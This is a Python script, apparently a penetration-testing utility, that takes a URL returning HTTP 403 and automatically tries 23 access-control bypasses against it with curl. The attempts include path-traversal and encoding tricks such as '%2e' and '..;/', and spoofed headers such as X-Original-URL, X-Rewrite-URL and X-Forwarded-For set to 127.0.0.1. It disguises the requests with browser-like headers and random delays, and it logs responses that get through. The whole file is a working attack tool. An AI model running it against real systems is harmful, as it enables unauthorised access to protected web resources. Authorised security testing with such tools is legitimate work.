import os
import time
import subprocess
import re  
import random
from datetime import datetime

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

script_dir = os.path.dirname(os.path.abspath(__file__))
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
output_dir = os.path.join(script_dir, f"bypass_results_{timestamp}")
os.makedirs(output_dir, exist_ok=True)

fullUrl = str(input("Please enter an url leading to a 403 error : "))
matchHostname = re.match(r"https?://([^/]+)", fullUrl)
matchPath = re.match(r"https?://[^/]+/(.*)", fullUrl)
matchMethod = re.match(r"([^:]+)", fullUrl)

if matchHostname and matchPath and matchMethod:
    HOSTNAME = matchHostname.group(1)
    PATH = matchPath.group(1)
    METHOD = matchMethod.group(1)
else:
    print("Invalid url")
    exit()

log_file = os.path.join(output_dir, "summary.txt")
        
headers = [
        ("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"),
        ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"),
        ("Accept-Language", "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"),
        ("Accept-Encoding", "gzip, deflate, br"),
        ("DNT", "1"),
        ("Connection", "keep-alive"),
        ("Upgrade-Insecure-Requests", "1"),
        ("Sec-Fetch-Dest", "document"),
        ("Sec-Fetch-Mode", "navigate"),
        ("Sec-Fetch-User", "?1"),
        ("Cache-Control", "max-age=0"),
        ("sec-ch-ua", '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"'),
        ("sec-ch-ua-mobile", "?0"),
        ("sec-ch-ua-platform", '"Windows"'),
    ]

urlListBuilder = [
    (f"{HOSTNAME}/{PATH}", [], "Original"),
    (f"{HOSTNAME}/%2e/{PATH}", [], "Path traversal %2e"),
    (f"{HOSTNAME}/{PATH}/.", [], "Trailing dot"),
    (f"{HOSTNAME}//{PATH}//", [], "Double slashes"),
    (f"{HOSTNAME}/./{PATH}/./", [], "Dot segments"),
    (f"{HOSTNAME}/{PATH}anything", [("X-Original-URL", f"/{PATH}")], "X-Original-URL"),
    (f"{HOSTNAME}/{PATH}", [("X-Custom-IP-Authorization", "127.0.0.1")], "X-Custom-IP-Authorization"),
    (f"{HOSTNAME}", [("X-Rewrite-URL", f"/{PATH}")], "X-Rewrite-URL"),
    (f"{HOSTNAME}/{PATH}", [("Referer", f"/{PATH}")], "Referer"),
    (f"{HOSTNAME}/{PATH}", [("X-Originating-IP", "127.0.0.1")], "X-Originating-IP"),
    (f"{HOSTNAME}/{PATH}", [("X-Forwarded-For", "127.0.0.1")], "X-Forwarded-For"),
    (f"{HOSTNAME}/{PATH}", [("X-Remote-IP", "127.0.0.1")], "X-Remote-IP"),
    (f"{HOSTNAME}/{PATH}", [("X-Client-IP", "127.0.0.1")], "X-Client-IP"),
    (f"{HOSTNAME}/{PATH}", [("X-Host", "127.0.0.1")], "X-Host"),
    (f"{HOSTNAME}/{PATH}", [("X-Forwarded-Host", "127.0.0.1")], "X-Forwarded-Host"),
    (f"{HOSTNAME}/{PATH}%20/", [], "Trailing space encoded"),
    (f"{HOSTNAME}/%20{PATH}%20/", [], "Spaces around path"),
    (f"{HOSTNAME}/{PATH}?", [], "Trailing question mark"),
    (f"{HOSTNAME}/{PATH}???", [], "Multiple question marks"),
    (f"{HOSTNAME}/{PATH}//", [], "Double trailing slash"),
    (f"{HOSTNAME}/{PATH}/", [], "Single trailing slash"),
    (f"{HOSTNAME}/{PATH}/.randomstring", [], "Hidden file"),
    (f"{HOSTNAME}/{PATH}..;/", [], "Semicolon bypass"),
]

with open(log_file, "w", encoding="utf-8") as log:
    log.write(f"403 Bypass Test Results\n")
    log.write(f"Target: {METHOD}://{HOSTNAME}/{PATH}\n")
    log.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    log.write("="*80 + "\n\n")
    
    test_number = 1
    success_count = 0
    redirect_count = 0
    
    for url, extra_headers, description in urlListBuilder:
        cmd = ["curl", "-X", "GET", f"{METHOD}://{url}"]
            
        for key, value in headers:
            cmd.extend(["-H", f"{key}: {value}"])

        for key, value in extra_headers:
            cmd.extend(["-H", f"{key}: {value}"])
            
        cmd.extend([
            "--compressed",
            "-L",
            "-s",
            "-i",
            "-w", "\nHTTP_CODE:%{http_code}\n"
        ])

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            http_code_match = re.search(r"HTTP_CODE:(\d+)", result.stdout)
            
            if http_code_match:
                http_code = http_code_match.group(1)
                
                if http_code == "200" or http_code.startswith("3"):
                    safe_description = re.sub(r'[^\w\-]', '_', description)
                    response_file = os.path.join(output_dir, f"{test_number:02d}_{safe_description}_{http_code}.txt")
                    
                    with open(response_file, "w", encoding="utf-8", errors="ignore") as f:
                        f.write(f"Test: {description}\n")
                        f.write(f"URL: {METHOD}://{url}\n")
                        f.write(f"HTTP Code: {http_code}\n")
                        if extra_headers:
                            f.write(f"Extra Headers: {extra_headers}\n")
                        f.write("="*80 + "\n\n")
                        f.write("CURL COMMAND:\n")
                        f.write(" ".join(cmd) + "\n\n")
                        f.write("="*80 + "\n\n")
                        f.write("RESPONSE:\n")
                        f.write(result.stdout)
                        if result.stderr:
                            f.write("\n\nSTDERR:\n")
                            f.write(result.stderr)
                    
                    if http_code == "200":
                        print(f"\033[92m✓ SUCCESS [200]\033[0m : {description} -> {METHOD}://{url}")
                        if extra_headers:
                            print(f"  Headers: {extra_headers}")
                        print(f"  Response length: {len(result.stdout)} bytes")
                        print(f"  Saved to: {response_file}\n")
                    
                        log.write(f"[SUCCESS] Test #{test_number}: {description}\n")
                        log.write(f"  URL: {METHOD}://{url}\n")
                        if extra_headers:
                            log.write(f"  Extra Headers: {extra_headers}\n")
                        log.write(f"  Response File: {response_file}\n")
                        log.write(f"  Response Length: {len(result.stdout)} bytes\n\n")
                        success_count += 1
                    
                    elif http_code.startswith("3"):
                        location_match = re.search(r"Location:\s*(.+)", result.stdout, re.IGNORECASE)
                        redirect_url = location_match.group(1).strip() if location_match else "Unknown"
                        
                        print(f"\033[93m→ REDIRECT [{http_code}]\033[0m : {description} -> {METHOD}://{url}")
                        print(f"  Redirect to: {redirect_url}")
                        if extra_headers:
                            print(f"  Headers: {extra_headers}")
                        print(f"  Saved to: {response_file}\n")
                        
                        log.write(f"[REDIRECT {http_code}] Test #{test_number}: {description}\n")
                        log.write(f"  URL: {METHOD}://{url}\n")
                        log.write(f"  Redirect to: {redirect_url}\n")
                        if extra_headers:
                            log.write(f"  Extra Headers: {extra_headers}\n")
                        log.write(f"  Response File: {response_file}\n\n")
                        redirect_count += 1
                    
                else:
                    print(f"\033[91m✗ FAILED [{http_code}]\033[0m : {description} -> {METHOD}://{url}")
            else:
                print(f"\033[91m✗ NO HTTP CODE\033[0m : {description} -> {METHOD}://{url}")
        
        except subprocess.TimeoutExpired:
            print(f"\033[91m✗ TIMEOUT\033[0m : {description} -> {METHOD}://{url}")

        test_number += 1
        time.sleep(random.uniform(0.5, 2.0))
    
    log.write(f"\n{'='*80}\n")
    log.write(f"Total successful bypasses (200): {success_count}\n")
    log.write(f"Total redirects (3xx): {redirect_count}\n")
    log.write(f"Total interesting responses: {success_count + redirect_count}\n")

print(f"\n{'='*80}")
print(f"Results:")
print(f"  - Successful bypasses (200): {success_count}")
print(f"  - Redirects (3xx): {redirect_count}")
print(f"  - Total interesting: {success_count + redirect_count}")
print(f"\nAll responses saved in: {output_dir}")
print(f"Summary log: {log_file}")
print(f"{'='*80}")